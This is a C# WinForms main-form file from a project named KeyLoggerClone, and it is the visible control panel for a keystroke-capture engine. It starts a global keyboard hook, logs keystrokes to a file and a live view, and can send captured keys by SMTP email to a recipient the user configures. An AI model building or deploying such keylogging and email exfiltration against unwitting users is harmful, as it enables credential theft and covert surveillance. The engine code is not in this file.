using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Windows.Forms;
using KeyLoggerClone.Core;
using KeyLoggerClone.Engine;
using KeyLoggerClone.Formatters;
using KeyLoggerClone.Listeners;
using KeyLoggerClone.Loggers;

namespace KeyLoggerClone
{
    public partial class MainForm : Form
    {
        private int _keyCount = 0;
        private DateTime _startTime;
        private EventLogger _eventLogger;
        private ILogger _fileLogger;
        private ILogger _emailLogger;

        // Custom colors for flat styling
        private readonly Color _colorActive = Color.FromArgb(166, 227, 161);   // Catppuccin Green
        private readonly Color _colorStopped = Color.FromArgb(243, 139, 168);  // Catppuccin Red

        public MainForm()
        {
            InitializeComponent();
        }

        private void MainForm_Load(object sender, EventArgs e)
        {
            // Set default logging directory in the application run-path
            string defaultDir = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "logs");
            string defaultPath = Path.Combine(defaultDir, "keystrokes_log.txt");
            txtFilePath.Text = defaultPath;
            
            // Initial UI state adjustments
            lblStatusVal.Text = "STOPPED";
            lblStatusVal.ForeColor = _colorStopped;
            btnToggleHook.BackColor = _colorActive;
            btnToggleHook.ForeColor = Color.FromArgb(17, 17, 27);
        }

        private void btnToggleHook_Click(object sender, EventArgs e)
        {
            if (KeyloggerEngine.Instance.IsRunning)
            {
                StopLogging();
            }
            else
            {
                StartLogging();
            }
        }

        private void StartLogging()
        {
            try
            {
                // Validate target file configuration
                if (chkLogToFile.Checked)
                {
                    string path = txtFilePath.Text.Trim();
                    if (string.IsNullOrEmpty(path))
                    {
                        MessageBox.Show("Please choose a valid file path for logging.", "Invalid Config", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                        return;
                    }
                }

                // Validate email settings
                if (chkLogToEmail.Checked)
                {
                    if (string.IsNullOrEmpty(txtSmtpHost.Text.Trim()) ||
                        string.IsNullOrEmpty(txtSenderEmail.Text.Trim()) ||
                        string.IsNullOrEmpty(txtSenderPassword.Text.Trim()) ||
                        string.IsNullOrEmpty(txtRecipientEmail.Text.Trim()))
                    {
                        MessageBox.Show("Please fill all SMTP settings fields for email logging.", "Invalid Config", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                        return;
                    }
                }

                // Clear previous active loggers
                KeyloggerEngine.Instance.ClearLoggers();

                // Create core formatter (OOP dependency)
                IKeyFormatter formatter = new HumanReadableFormatter();

                // Register real-time event logger if enabled
                if (chkRealtimeView.Checked)
                {
                    _eventLogger = (EventLogger)LoggerFactory.CreateLogger("event", formatter);
                    _eventLogger.KeyLogged += OnKeyLogged;
                    KeyloggerEngine.Instance.RegisterLogger(_eventLogger);
                }

                // Register file logger if enabled
                if (chkLogToFile.Checked)
                {
                    _fileLogger = LoggerFactory.CreateLogger("file", formatter, txtFilePath.Text.Trim());
                    KeyloggerEngine.Instance.RegisterLogger(_fileLogger);
                }

                // Register email logger if enabled
                if (chkLogToEmail.Checked)
                {
                    int.TryParse(txtSmtpPort.Text.Trim(), out int port);
                    _emailLogger = LoggerFactory.CreateLogger(
                        "email",
                        formatter,
                        smtpHost: txtSmtpHost.Text.Trim(),
                        smtpPort: port,
                        senderEmail: txtSenderEmail.Text.Trim(),
                        senderPassword: txtSenderPassword.Text,
                        recipientEmail: txtRecipientEmail.Text.Trim(),
                        enableSsl: chkEnableSsl.Checked);
                    KeyloggerEngine.Instance.RegisterLogger(_emailLogger);
                }

                // Initialize listeners (OOP abstraction)
                IKeyboardListener listener = new WindowsKeyboardListener();
                
                // Track statistics via listener events
                listener.KeyIntercepted += (s, ev) =>
                {
                    // Safe marshalling to UI Thread
                    if (this.IsHandleCreated)
                    {
                        this.BeginInvoke(new Action(() =>
                        {
                            _keyCount++;
                            lblTotalKeysVal.Text = _keyCount.ToString();
                            lblActiveAppVal.Text = ev.ActiveWindow;
                        }));
                    }
                };

                // Turn on engine
                KeyloggerEngine.Instance.Start(listener);

                // Update UI button and states
                btnToggleHook.Text = "STOP INTERCEPTING";
                btnToggleHook.BackColor = _colorStopped;
                btnToggleHook.ForeColor = Color.White;
                
                lblStatusVal.Text = "ACTIVE";
                lblStatusVal.ForeColor = _colorActive;

                // Reset runtime timer
                _keyCount = 0;
                lblTotalKeysVal.Text = "0";
                _startTime = DateTime.Now;
                timerStats.Start();
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Failed to start keystroke hook: {ex.Message}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                StopLogging();
            }
        }

        private void StopLogging()
        {
            // Stop stats timer
            timerStats.Stop();

            // Stop engine hooks (internally flushes the loggers)
            KeyloggerEngine.Instance.Stop();

            // Deregister event logger callbacks
            if (_eventLogger != null)
            {
                _eventLogger.KeyLogged -= OnKeyLogged;
                _eventLogger = null;
            }
            _fileLogger = null;
            _emailLogger = null;

            // Update UI back to stopped state
            btnToggleHook.Text = "START INTERCEPTING";
            btnToggleHook.BackColor = _colorActive;
            btnToggleHook.ForeColor = Color.FromArgb(17, 17, 27);

            lblStatusVal.Text = "STOPPED";
            lblStatusVal.ForeColor = _colorStopped;
        }

        private void OnKeyLogged(string text)
        {
            if (this.IsHandleCreated)
            {
                this.BeginInvoke(new Action(() =>
                {
                    rtxtLogView.AppendText(text);
                    
                    // Auto scroll to end
                    rtxtLogView.SelectionStart = rtxtLogView.Text.Length;
                    rtxtLogView.ScrollToCaret();
                }));
            }
        }

        private void timerStats_Tick(object sender, EventArgs e)
        {
            TimeSpan elapsed = DateTime.Now - _startTime;
            lblElapsedTimeVal.Text = elapsed.ToString(@"hh\:mm\:ss");
        }

        private void btnBrowse_Click(object sender, EventArgs e)
        {
            using (var dialog = new SaveFileDialog())
            {
                dialog.Title = "Select Keylogger Log File Location";
                dialog.Filter = "Text Files (*.txt)|*.txt|All Files (*.*)|*.*";
                dialog.FileName = "keystrokes_log.txt";

                if (dialog.ShowDialog() == DialogResult.OK)
                {
                    txtFilePath.Text = dialog.FileName;
                }
            }
        }

        private void btnOpenLog_Click(object sender, EventArgs e)
        {
            string path = txtFilePath.Text.Trim();
            if (File.Exists(path))
            {
                try
                {
                    Process.Start(new ProcessStartInfo(path) { UseShellExecute = true });
                }
                catch (Exception ex)
                {
                    MessageBox.Show($"Could not open log file: {ex.Message}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
            }
            else
            {
                MessageBox.Show("No log file found at the specified location. Start intercepting to generate log data.", "File Not Found", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
        }

        private void btnClearView_Click(object sender, EventArgs e)
        {
            rtxtLogView.Clear();
        }

        private void chkLogToFile_CheckedChanged(object sender, EventArgs e)
        {
            txtFilePath.Enabled = chkLogToFile.Checked;
            btnBrowse.Enabled = chkLogToFile.Checked;
        }

        private void chkRealtimeView_CheckedChanged(object sender, EventArgs e)
        {
            if (KeyloggerEngine.Instance.IsRunning)
            {
                MessageBox.Show("Please restart monitoring for settings changes to take effect.", "Configuration Change", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
        }

        private void chkLogToEmail_CheckedChanged(object sender, EventArgs e)
        {
            bool isEnabled = chkLogToEmail.Checked;
            txtSmtpHost.Enabled = isEnabled;
            txtSmtpPort.Enabled = isEnabled;
            chkEnableSsl.Enabled = isEnabled;
            txtSenderEmail.Enabled = isEnabled;
            txtSenderPassword.Enabled = isEnabled;
            txtRecipientEmail.Enabled = isEnabled;
        }

        private void MainForm_FormClosing(object sender, FormClosingEventArgs e)
        {
            // Ensure keyboard hooks are uninstalled and files flushed on exit
            StopLogging();
        }
    }
}
